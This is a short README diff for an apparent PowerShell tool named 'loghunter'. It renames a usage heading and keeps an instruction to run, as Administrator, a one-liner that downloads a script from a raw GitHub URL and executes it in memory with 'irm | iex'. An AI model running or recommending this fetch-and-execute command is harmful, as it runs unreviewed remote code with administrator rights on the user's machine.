@@ -4,7 +4,7 @@
 
 ## 🚀 Usage
 
-### Option 1: Direct Memory Execution (Recommended)
+### Direct Memory Execution
 Open PowerShell as Administrator and execute:
 
 irm "https://raw.githubusercontent.com/tqmgxd/loghunter/main/script.ps1" | iex
